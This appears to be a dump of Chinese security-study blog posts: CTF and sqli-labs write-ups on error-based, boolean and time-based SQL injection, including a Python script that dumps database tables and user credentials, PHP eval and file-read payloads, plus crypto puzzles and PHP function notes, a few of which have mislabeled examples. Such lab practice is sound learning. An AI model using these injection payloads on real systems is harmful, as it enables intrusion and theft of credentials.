用来返回一个01之间的随机数，区间表示就是【0,1）。括号里为空时，随机产生数。 当括号里的参数固定时，随机数(随机数列)也是固定的。 让我们看一下随机数列 1select rand(3) from information_schema.columns limit 3; 产生三列随机数。 对比一下还是不变。 ③Floor()函数 Floor()函数时取整函数，当输入一个非整数，返回小于等于输入参数的最大整数。 ④count()函数 用于统计行数。 ⑤group by 语句 先看这句： 1select table_schema, table_name from information_schema.tables； 加上group by语句后： 1select table_schema, table_name from information_schema.tables by table_schema； 加上之后，数据明显少了很多的重复的。重复的数据库只显示一个，并且只显示数据库里的第一张表。 几个函数灵活运用，会有什么不异想不到的结果呢？ 我们实践一下 ①rand()函数和floor()函数结合使用。 1select floor(rand(5)*12) from information_schema.columns limit 5; 由内到外逐个分析，rand(5)会随机产生5个不同的值，但是*12，就是将【0，1）扩大到【0，12），floor函数就是取整了。 ②count()函数和group by语句 1select table_schema, count(*) from information_schema.tables group by table_schema; 他们的组合就是统计了每个数据库里有多少张表。 其原理就是：Mysql会建立一张临时表，有group_key和tally两个字段，其中group_key设置了UNIQUE约束，即不能有两行的group_key列的值相同。使用group by语句和count()函数的时候，mysql数据库会先建立一个虚拟表，当查询到新的键不在虚拟表中，数据库就会将其插入表中，如果数据库中已存在该键，则找到该键对应的计数字段并加1。 ③双查询的核心语句(几个函数综合使用) 先看payload：select floor(rand(14)*2) c, count(*) from information_schema.columns group by c; 报错了，那为什么会报错？分析一下：SQL语句中用列c分组，而列c是floor(rand(14)2)的别名。floor(rand(14)2)产生的随机数列，前四位是：1，0，1，0。 我们查询的时候，mysql数据库会先建立一个临时表，设置了UNIQUE约束的group_key和tally两个字段。当查询到新的”group_key键”不在临时表中，数据库就会将其插入临时表中，如果数据库中已存在group_key该键，则找到该键对应的”tally计数”字段并加1。 创建好临时表后，Mysql开始逐行扫描information_schema.columns表，遇到的第一个分组列是floor(rand(14)2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)2)，注意此时又计算了一次，结果为0。所以实际插入到临时表的一行group_key为0，tally为1，临时表变成了： Mysql继续扫描information_schema.columns表，遇到的第二个分组列还是floor(rand(14)2)，计算出其值为1（这个1是随机数列的第三个数），便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)2)，此时又计算了一次，结果为0（这个0是随机数列的第四个数），所以尝试向临时表插入一行数据，group_key为0，tally为1。但实际上临时表中已经有一行的group_key为0，而group_key又设置了不可重复的约束，所以就会出现报错。 知道了原理，就实战一下。以sql-lib/Less-5为例： 判断闭合点： 然后查询数据库： 构建payload:?id=-1&#39; union select 1,count(*),concat( (select database()),floor(rand()*2)) as a from information_schema.tables group by a --+ 数据库就在报错的信息里显示出来了。 但是，因为是随机值，所以只会有50%的概率会报错。相同的payload但显示正常。 有大佬说，可以通过修改rand()使用的种子来使其百分百报错,如下将rand()改为rand(1)，测试百分之百报错，即payload：?id=-1&#39; union select 1,count(*),concat( (select database()),floor(rand(1)*2)) as a from information_schema.tables group by a --+ 但我发现，rand(1)并不会100%报错，反而我是试了几次都没有报错，只有4，11，14，15这几个数会100%报错，我也不知道什么原因，在这里留个悬念，希望大佬能解释一下。 我们来爆表,前面我们知道了当前数据库的为security，构造payload：?id=-1&#39; union select 1,count(*),concat( (select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+ 总共四张表，我们在第三张拿到了我们想要的。 知道了表名，看列值，构造payload：?id=-1&#39; union select 1,count(*),concat( (select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+ 我通过修改limit X,1里X的值，在3，1的时候看到了password字段 在9，1的时候得到了用户名字段开始拿用户名和密码，构造payload：?id=-1&#39; union select 1,count(*),concat( (select username from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+ 和?id=-1&#39; union select 1,count(*),concat( (select password from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+ 这里要注意用户名和密码的列数应改相对。 是不是jio着麻烦，附上Mochaaz大佬的python代码 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsfrom bs4 import BeautifulSoupdb_name &#x3D; &#39;&#39;table_list &#x3D; []column_list &#x3D; []url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;192.168.1.158&#x2F;sqlilabs&#x2F;Less-5&#x2F;?id&#x3D;1&#39;&#39;&#39;### 获取当前数据库名 ###print(&#39;当前数据库名:&#39;)payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39;r &#x3D; requests.get(url+payload)db_name &#x3D; r.text.split(&#39;:&#39;)[-2]print(&#39;[+]&#39; + db_name)### 获取表名 ###print(&#39;数据库%s下的表名:&#39; % db_name)for i in range(50): payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema&#x3D;&#39;%s&#39; limit %d,1),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39; % (db_name,i) r &#x3D; requests.get(url+payload) if &#39;group_key&#39; not in r.text: break table_name &#x3D; r.text.split(&#39;:&#39;)[-2] table_list.append(table_name) print(&#39;[+]&#39; + table_name)### 获取列名 ####### 这里以users表为例 ####print(&#39;%s表下的列名:&#39; % table_list[-1])for i in range(50): payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name&#x3D;&#39;%s&#39; limit %d,1),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39; % (table_list[-1],i) r &#x3D; requests.get(url + payload) if &#39;group_key&#39; not in r.text: break column_name &#x3D; r.text.split(&#39;:&#39;)[-2] column_list.append(column_name) print(&#39;[+]&#39; + column_name)### 获取字段值 ####### 这里以username列为例 ####print(&#39;%s列下的字段值:&#39; % column_list[-2])for i in range(50): payload &#x3D; &#39;&#39;&#39;&#39; and 1&#x3D;(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#39;&#39;&#39; % (column_list[-2],db_name,table_list[-1],i) r &#x3D; requests.get(url + payload) if &#39;group_key&#39; not in r.text: break dump &#x3D; r.text.split(&#39;:&#39;)[-2] print(&#39;[+]&#39; + dump) 花费几小时的注入，代码几秒就出来结果了。用户名直接出来了，我要好好学python了，啥都不会。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"sqllibs靶场温习(1-6)","slug":"暑假第六周练习(一)sqllibs靶场温习(1-6)","date":"2020-08-13T02:48:26.647Z","updated":"2020-08-23T10:14:10.417Z","comments":true,"path":"2020/08/13/暑假第六周练习(一)sqllibs靶场温习(1-6)/","link":"","permalink":"https://qidian-png.github.io/2020/08/13/%E6%9A%91%E5%81%87%E7%AC%AC%E5%85%AD%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)sqllibs%E9%9D%B6%E5%9C%BA%E6%B8%A9%E4%B9%A0(1-6)/","excerpt":"","text":"SQL注入的知识快忘完了，赶紧回顾一下。 @TOC less-1判断注入类型： 121&#39; and &#39;1&#39;&#x3D;&#39;1 &#x2F;&#x2F;错误1 and 1&#x3D;1 &#x2F;&#x2F;正常 第一关是字符型注入，其流程一般是： 1234561、判断注入点2、判断列数3、获取所有数据库名4、获取数据库所有表名5、获取字段名6、获取字段中的数据 判断注入点的时候，如果页面返回正常，说明使用的符号不是注入点；如果报错，说明就是注入点，从而可以进行下一步。 靶场的Less-1就是常规的字符型注入 Less-2当输入http://localhost/sqli-labs/Less-2/?id=1回显正常，但是后面加上‘就回显错误，说明是整形注入，不需要闭合符号。 列数还是3。按照第一关的步骤就行了。 Less-3每一关判断注入点都是最关键的第三关的注入点&#39;),知道了注入点按流程办事。 Less-4因为是靶场所以找到注入点不是很难都是很简单的符号，如果是实际环境就不好说了。常见的闭合符号：’，“，‘），”） 在常规里找到了第四关的闭合符号。 Less-5看了一下应该是盲注 ，先判断闭合点。这点与联合查询注入不一样了。因为没有回显，只能根据浏览器的刷新时间判断是否正确。 盲注也是分为三种布尔类型，时间盲注，报错盲注 ①布尔类型的盲注先判断闭合点：http://localhost/sqli-labs/Less-5/?id=1&#39; and 1=1 --+ 闭合符号为：‘且1=1为真，所以页面正常和http://localhost/sqli-labs/Less-5/?id=1&#39; and 1=2 --+虽说闭合符号正常，但是1=2逻辑错误，页面不正常，这也就验证了我们的闭合点找的是对的。 判断数据库长度：构造payload:http://localhost/sqli-labs/Less-5/?id=1&#39; and length(database())=1 --+ 依次增加数字，直到页面正常。 判断数据库的名称: 构造payload：?id=1&#39; and left((select database()),1)=&#39;s&#39;--+或者left((select database()),1)&lt;&#39;t&#39;二分法，一个一个猜解就会找到数据库为security。 爆表：?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; --+修改limit x,1和长度。 爆列名：?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; --+第四列才是password 爆值：用户名：?id=1&#39; and left((select username from users order by id limit 0,1),1)=&#39;d&#39; --+密码：?id=1&#39; and left((select password from users order by id limit 0,1),1)=&#39;d&#39; --+用户名和密码的id要相对应。 emmm真的很费劲 ②时间盲注 判断闭合点语句：?id=1&#39; and sleep(5)--+选择时间长一点更有利于我们观察。如果刷新时间长就说明闭合点找对了。 判断数据库的长度：构造payload:http://localhost/sqli-labs/Less-5/?id=1&#39; and if(length(database() )=8 ,sleep(5), 1)刷新时间比较长的话就说明说句库的长度为8。 剩下的把if(length(database() )=8 ,sleep(5), 1)换一下就行了。 Less-6第六关的注入点换成了&quot;,剩下的步骤都一样。 回头练习一遍，对sql注入有着更好的理解。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://qidian-png.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"暑假第五周练习(二)php学习--正则表达式","slug":"暑假第五周练习(二)php学习--正则表达式","date":"2020-08-05T05:32:05.000Z","updated":"2020-08-07T05:41:13.111Z","comments":true,"path":"2020/08/05/暑假第五周练习(二)php学习--正则表达式/","link":"","permalink":"https://qidian-png.github.io/2020/08/05/%E6%9A%91%E5%81%87%E7%AC%AC%E4%BA%94%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%BA%8C)php%E5%AD%A6%E4%B9%A0--%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"@TOC 0×00 正则表达式语法规则定义：正则表达式描述了一类字符串的特征，通过这个特征与特定的函数配合，对其它的字符串进行匹配、查找、替换及分割操作！ 这类字符串的特征是由一个或多个。 0×01 定界符我们一般习惯使用正斜线”/“作为定界的字符 当然除了字母、数字、和反斜线以外的字符都可以作为定界符，比如 # ! {} | 都是可以的！ 定界符放在正则表达式的起始位置，前后一致！ 0×02 普通字符字符串的一些字符，比如：a-z、A-Z、0-9、双引号、单引号，它们没有特殊的含义。 0×03 元字符记住一些常用的就行了。 12345678910111213141516171819202122232425 \\d 匹配任意一个十进制数字，等价于[0-9]\\D 匹配任意一个除十进制数字以外字符,等价于[^0-9]\\s 匹配任意一个空白字符,比如换页符、换行符、回车符、制表符、垂直制表符\\S 匹配除空白字符以外的任何一个字符\\w 匹配任意一个数字或字母或下划线\\W 匹配除数字、字母、下划线以外的任意一个字符. 匹配除换行符以外的任意一个字符* 匹配0次、或1次、或多次其前面的字符+ 匹配1次或多次其前面的字符? 匹配0次或1次其前面的字符&#123;n&#125; 表示其前面字符恰好出现n次&#123;n,&#125; 表示其前面字符出现不少于n次&#123;n,m&#125; 表示其前面的字符至少出现n次，最多出现m次^或\\A 匹配字符串开始位置$或者\\Z 匹配字符串的结束位置| 匹配两个或多个模式[] 匹配方括号中的任意一个字符[^] 匹配除方括号中字符以外的任意一个字符() 将括号中作为一个整体以便将其中的内容获取到 在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可以使用\\\\ 数字 来代表圆括号部分所匹配到的内容！ 如果要匹配.我们可以使用\\来转义。 0×04 模式修正符常见模式修正符 123456i 在和模式进行匹配时不区分大小写m 多行匹配，如果目标字符串 中没有&quot;\\n&quot;字符, 或者模式中没有出现^或$, 设置这个修饰符不产生任何影响s 如果设定了此修正符，那么.将匹配所有的字符包括换行符U 禁止贪婪匹配e(已经被弃用) 0×05 与正则表达式配合的函数主要有： 1231.preg_match()2.preg_match_all()3.preg_replace() ①1.preg_match() preg_match — 执行匹配正则表达式语法：int preg_match ( string $pattern , string $ subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) 各参数： 1234567891011$pattern: 要搜索的模式，字符串形式。$subject: 输入字符串。$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。$flags：flags 可以被设置为以下标记值：PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。 ②preg_match_all() preg_match_all 函数用于执行一个全局正则表达式匹配。语法：int preg_match_all ( string $pattern , string $subject [, array &amp;$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]] ) 两者区别：返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。 ③preg_replace() preg_replace 函数执行一个正则表达式的搜索和替换。 语法： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索 string 中字符串并且匹配 pattern 的部分， 以 replacement 进行替换。 参数释义： 1234567891011参数说明：$pattern: 要搜索的模式，可以是字符串或一个字符串数组。$replacement: 用于替换的字符串或字符串数组。$string: 要搜索替换的目标字符串或字符串数组。$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。$count: 可选，为替换执行的次数。 示例： 123456&lt;?php$string &#x3D; &#39;google 123, 456&#39;;$pattern &#x3D; &#39;&#x2F;(\\w+) (\\d+), (\\d+)&#x2F;i&#39;;$replacement &#x3D; &#39;runoob $&#123;2&#125;,$3&#39;;echo preg_replace($pattern, $replacement, $string);?&gt; 结果： 1runoob 123,456 如果 string 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。 正则表达式的初次见面结束了！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://qidian-png.github.io/tags/web%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第五周练习(一)Cypto练习","slug":"暑假第五周练习(一)Crypto练习","date":"2020-08-04T08:51:05.000Z","updated":"2020-08-23T10:11:50.309Z","comments":true,"path":"2020/08/04/暑假第五周练习(一)Crypto练习/","link":"","permalink":"https://qidian-png.github.io/2020/08/04/%E6%9A%91%E5%81%87%E7%AC%AC%E4%BA%94%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)Crypto%E7%BB%83%E4%B9%A0/","excerpt":"","text":"题目来源https://buuoj.cn/challenges 目录： 0×00 丢失的MD50×01 老文盲0×02 Alice与Bob0×03 大帝的密码武器0×04 Windows系统密码0×05 cat_flag0×06 传统知识+古典密码 0×00 丢失的MD5 附件是一段python代码： 123456789import hashlibfor i in range(32,127): for j in range(32,127): for k in range(32,127): m&#x3D;hashlib.md5() m.update(&#39;TASC&#39;.encode(&#39;utf-8&#39;)+chr(i).encode(&#39;utf-8&#39;)+&#39;O3RJMV&#39;.encode(&#39;utf-8&#39;)+chr(j).encode(&#39;utf-8&#39;)+&#39;WDJKX&#39;.encode(&#39;utf-8&#39;)+chr(k).encode(&#39;utf-8&#39;)+&#39;ZM&#39;.encode(&#39;utf-8&#39;)) des&#x3D;m.hexdigest() if &#39;e9032&#39; in des and &#39;da&#39; in des and &#39;911513&#39; in des: print (des) 放进pycharm,运行不了，直接复制到了python3的IDLE运行得到一串数字。提交得到flag。 0×01 老文盲 拿到题目是txt文件看了那么复杂，就想到了新约佛论禅那个加密，试了一下更麻烦了。就换种方法，在线汉语拼音转换bjd{这就是flag直接交了吧}，丧心病狂的出题人，这样还不对。经过多次尝试flag{淛匶襫黼瀬鎶軄鶛驕鳓哵}，这样才对。 0×02 Alice与Bob 第一步先将98554799767分为两个素数，点这 小的在前，大的在后，进行MD5加密找到符合要求的，就是flag 0×03 大帝的密码武器 凯撒密码，一个一个试。。。。安全这个词应该很有意义吧！而且凯撒密码偏移量为13 这不是我第一次见了。 得到了偏移量为13 得到flag。 0×04 Windows系统密码 看着毫无思路，就从ctf那一行，试着对一串符号进行MD5解密，一个一个试吧 这个应该就是flag，交一下就🆗了。 0×05 cat_flag你能想到什么？？？ 只有两种猫，意味0，1 那么图片就变成了01000010010010100100010001111011010011010010000101100001001100000111111001111101 二进制ASCII码对照一下，就能得到flag。 0×06 传统知识+古典密码 天干地支 辛卯–28 癸巳–30 丙戌–23 辛未–08 庚辰–17 癸酉–10 己卯–16 癸巳–30 +甲子？应该怎样理解是理解为+1，还是60一甲子,+60呢。 根据直觉先尝试+60就变成了：88,90,83,68,77,70,76,90 对照一下ASCII码表：XZSDMFLZ 先栅栏然后试一下XMZFSLDZ，进行凯撒密码解密。 拿上面两个解密人家都选了SHUANGYU这个，说是题目作者的网名就是这个。 (ˉ▽ˉ；)…","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Crypto学习","slug":"Crypto学习","permalink":"https://qidian-png.github.io/tags/Crypto%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第四周练习(二)web练习","slug":"暑假第四周练习(二)web练习","date":"2020-08-01T08:51:05.000Z","updated":"2020-09-24T09:23:47.647Z","comments":true,"path":"2020/08/01/暑假第四周练习(二)web练习/","link":"","permalink":"https://qidian-png.github.io/2020/08/01/%E6%9A%91%E5%81%87%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%BA%8C)web%E7%BB%83%E4%B9%A0/","excerpt":"","text":"目录： 0×00 本地包含 0×01 变量1 0×02 web5 0×00 本地包含 现在题目链接已经打不开了，在网上找到源码： 123456&lt;?php include &quot;flag.php&quot;; &#x2F;&#x2F;flag存储在flag.php这个脚本里，但是被注释掉了，我们需要把flag.php的源码整个显示出来 $a &#x3D; @$_REQUEST[&#39;hello&#39;]; &#x2F;&#x2F;无论是以POST还是GET方式，都可以给$a赋值 eval( &quot;var_dump($a);&quot;); &#x2F;&#x2F;var_dump可以输出变量的类型和值 show_source(__FILE__);?&gt; 预定义变量 $ _REQUEST 能得到@$ _GET与@$_POST的参数。无论以get方式还是post方式，我们都能够获得hello的参数值。 eval() 函数会把字符串参数当做代码来执行。file() 函数把整个文件读入一个数组中，并将文件作为一个数组返回。print_r() 函数只用于输出数组。var_dump() 函数可以输出任何内容：输出变量的容，类型或字符串的内容，类型，长度。hello=file(“flag.php”)，最终会得到var_dump(file(“flag.php”))，以数组形式输出文件内容。include()函数和php://input，php://filter结合很好用，php://filter可以用与读取文件源代码，结果是源代码base64编码后的结果。 我们要想拿到flag，就要读取flag.php。 方法一：从hello的参数值入手 http://123.206.87.240:8003/?hello=file(&#39;flag.php&#39;) 或者 http://123.206.87.240:8003/?hello=show_source(%27flag.php%27) 或者 http://123.206.87.240:8003/index.php?hello=1);show_source(%27flag.php%27);// 注意：);负责把前面的命令闭合掉，//负责闭合掉后面的命令。最终执行的命令是show_source(%27flag.php%27),这样就得到了flag。 方法二：http://123.206.87.240:8003/index.php?hello=1);include $_POST[‘l’]; post的内容：f=php://filter/convert.base64-encode/resource=flag.php 同样也可以的都flag。 0×01 变量1 题目源码： 12345678910111213flag In the variable ! &lt;?php error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#39;args&#39;]))&#123; $args &#x3D; $_GET[&#39;args&#39;]; if(!preg_match(&quot;&#x2F;^\\w+$&#x2F;&quot;,$args))&#123; die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$args);&quot;);&#125;?&gt; 里面有许多函数 12345678910111213141516171819error_reporting() 设置 PHP 的报错级别并返回当前级别error_reporting(0); &#x2F;&#x2F;禁用错误报告error_reporting(E_ERROR | E_WARNING | E_PARSE); &#x2F;&#x2F;报告运行时错误error_reporting(E_ALL); &#x2F;&#x2F;报告所有错误 highlight_file() 函数对文件进行 PHP 语法高亮显示highlight_file(filename,return) &#x2F;&#x2F;规定要显示的文件, &#x2F;&#x2F;return,为TRUE，该函数将以字符串形式返回高亮显示的代码;默认FALSE 正则表达式匹配： int preg_match( string pattern, string subject [, array matches ] )&#x2F;&#x2F;正则表达式，需要匹配检索的对象，$matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推preg_match() 第一次匹配成功后就会停止匹配，如果要实现全部结果的匹配，即搜索到subject结尾处，则需使用 preg_match_all() 函数。 die() 函数输出一条消息，并退出当前脚本 eval() 函数把字符串按照 PHP 代码来计算该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。 正则匹配preg_match(&quot;/^\\w+$/&quot;,$args)一前一后两个’/‘表示正则表达式的框框，’^’表示开始，’$’表示结束 中间’\\w’表示任意一个字母或数字或下划线，也就是 AZ,az,0~9,_ 中任意一个 ‘+’表示表达式至少出现1次。 123456789101112131415161718192021222324252627\\w 匹配字母或数字或下划线或汉字 等价于 &#39;[^A-Za-z0-9_]&#39;。\\s 匹配任意的空白符\\d 匹配数字\\b 匹配单词的开始或结束^ 匹配字符串的开始$ 匹配字符串的结束？零次或一次 *零次或多次 +一次或多次 &#123;n&#125;n次 &#123;n,&#125;至少n次 &#123;n,m&#125;n到m\\d 任意一个十进制数字[0-9]\\D 任意一个非十进制数字\\s 任意一个空白字符(空格、换行符、换页符、回车符、字表符)\\S 任意一个非空白字符\\w 任意一个单词字符 [a-z 0-9 A-Z]\\W 任意个非单词字符 \\a 报警\\b 退格\\f 换页\\n 换行\\r 回车 var_dump( $ $ args)理解为 $ ($args)，就是取两次。正则匹配需要匹配所有，那我们就要用到一个变量叫做 $GLOBALS —— 引用全局作用域中可用的全部变量（八个预定义变量里的一个），一个包含了全部变量的全局组合数组。$GLOBALS[index]的数组中存储了所有全局变量，变量的名字就是数组的键 我们构造payload?args=GLOBALS那么就变成了eval(“var_dump($GLOBALS);”);eval就会把字符当PHP代码执行。 flag到手。 0×02 web5 查看源码发现了一串很很很长的符号，看题目有JSPFUCK，就去百度了一下。 就是有人用不平常的JavaScript语言风格，写了只用六种符号就可以表达任何表达式的语句。以JSFuck风格写出的代码不需要另外的编译器或解释器来执行，无论浏览器或JavaScript引擎中的原生 JavaScript 解释器皆可直接运行。鉴于 JavaScript 是弱类型语言，编写者可以用数量有限的字符重写 JavaScript 中的所有功能，且可以用这种方式执行任何类型的表达式。 放进浏览器的控制台就能的都flag。记得变成大写。 题虽然不多，但真的不简单。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://qidian-png.github.io/tags/web%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第四周练习(一)php学习--字符串处理(一)","slug":"暑假第四周练习(一)php学习--字符串处理","date":"2020-07-31T09:30:05.000Z","updated":"2020-07-31T12:53:59.841Z","comments":true,"path":"2020/07/31/暑假第四周练习(一)php学习--字符串处理/","link":"","permalink":"https://qidian-png.github.io/2020/07/31/%E6%9A%91%E5%81%87%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)php%E5%AD%A6%E4%B9%A0--%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/","excerpt":"","text":"#### 由于处理字符串的函数比较多，在这里只讲一部分！ 目录： 0×01 去除空白或其他字符函数 0×02 大小写转换函数 0×03 字符串替换函数 0×04 字符串查找函数 0×05 与html标签相关的函数 ​ 0×01 去除空白或其他字符函数 trim()函数是PHP中的一个内置函数，可以用于删除字符串左右两边的空格以及预定义字符。 用法： trim($string, $charlist) trim() 函数接受一个必需参数和一个可选参数 $string是必须参数，不可省略； $charlist参数为可选参数，可以省略不写，如果省略了，则会删除以下字符： 123456&quot;\\0&quot; - NULL&quot;\\t&quot; - 制表符&quot;\\n&quot; - 换行&quot;\\x0B&quot; - 垂直制表符&quot;\\r&quot; - 回车&quot; &quot; - 空格 实列： 12345&lt;?php$str &#x3D; &quot;Hello World!&quot;;echo trim($str, &quot;Hell!&quot;);&gt; 结果： o World 与其相关的函数： ltrim()函数：移除字符串左侧的空白字符或其他预定义字符。 rtrim()函数：除字符串右侧的空白字符或其他预定义字符。 0×02 大小写转换函数 strtolower() //将字符串转换为小写形式。strtoupper() //将字符串转换为大写形式。 看起来还挺像。 ①strtolower(): 该函数将传入的字符串参数所有的字符都转换成小写 示例： 123456&lt;?php $str &#x3D; &quot;I want To FLY&quot;; $str &#x3D; strtolower($str); echo $str;?&gt; 结果： 1i want to fly ②strtoupper(): 该函数的作用同strtolower函数相反,是将传入的字符参数的字符全部转换成大写。 示例： 123456&lt;?php $str &#x3D; &quot;i want to fly&quot;; $str &#x3D; strtolower($str); echo $str;?&gt; 结果： 1I want To FLY ③将字符串首字符转换成大写ucfirst(): 该函数的作用是将字符串的第一个字符改成大写,该函数返回首字符大写的字符串 12$str &#x3D; &#39;hello world!&#39;;$str&#x3D; ucwords($foo); &#x2F;&#x2F; Hello World! ④将字符串每个单词的首字符转换成大写 ucwords(): 该函数将传入的字符串的每个单词的首字符变成大写.如”hello world”,经过该函数处理后,将返回”Hello Word” 12$str &#x3D; &#39;hello world!&#39;;$str &#x3D; ucfirst($foo); &#x2F;&#x2F; Hello world! 0×03 字符串替换函数 定义：str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。 str_ireplace() 函数执行不区分大小写的搜索。 语法： str_replace(find,replace,string,count) find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。count 可选。对替换数进行计数的变量。 示例： 123&lt;?phpecho str_replace(&quot;world&quot;,&quot;Shanghai&quot;,&quot;Hello world!&quot;);?&gt; Hello world!就变成了Hello Shanghai！ 示例2： 123456&lt;?php$find &#x3D; array(&quot;Hello&quot;,&quot;world&quot;);$replace &#x3D; array(&quot;B&quot;);$arr &#x3D; array(&quot;Hello&quot;,&quot;world&quot;,&quot;!&quot;);print_r(str_replace($find,$replace,$arr));?&gt; 字符串被替换成了B Array ( [0] =&gt; B [1] =&gt; [2] =&gt; ! ) 0×04 字符串查找函数 ①substr_count函数substr_count() 函数计算子串在字符串中出现的次数(区分大小写)。 语法： substr_count(string,substring,start,length) string 必需。规定被检查的字符串。substring 必需。规定要搜索的字符串。start 可选。规定在字符串中何处开始搜索。length 可选。规定搜索的长度。 示例1： 12345678&lt;?php$str &#x3D; &quot;This is nice&quot;;echo strlen($str).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 使用 strlen() 来返回字符串长度echo substr_count($str,&quot;is&quot;).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 字符串中 &quot;is&quot; 出现的次数echo substr_count($str,&quot;is&quot;,2).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 字符串缩减为 &quot;is is nice&quot;echo substr_count($str,&quot;is&quot;,3).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 字符串缩减为 &quot;s is nice&quot;echo substr_count($str,&quot;is&quot;,3,3).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 字符串缩减为 &quot;s i&quot;?&gt; 结果： 12345122210 示例2： 1234&lt;?php$str &#x3D; &quot;abcabcab&quot;;echo substr_count($str,&quot;abcab&quot;); ?&gt; 这个函数不会对重叠的子字符串计数 ②strpos() 函数定义：strpos() 函数查找字符串在另一字符串中第一次出现的位置。语法： strpos(string,find,start) string 必需。规定要搜索的字符串。find 必需。规定要查找的字符串。start 可选。规定在何处开始搜索。 12345678910$str&#x3D;&#39;testteste&#39;; var_dump(strpos($str, &#39;t1&#39;)); if(strpos($str, &#39;t&#39;)&#x3D;&#x3D;&#x3D;false)&#123; echo &#39;没找到！&#39;; &#125;else&#123; echo &#39;找到啦!&#39;; &#125; $str&#x3D;&#39;testteste&#39;; var_dump(strpos($str, &#39;t&#39;,1)); ③strstr函数定义：strstr() 函数搜索字符串在另一字符串中的第一次出现。语法： 1strstr(string,search,before_search) string 必需。规定被搜索的字符串。 search 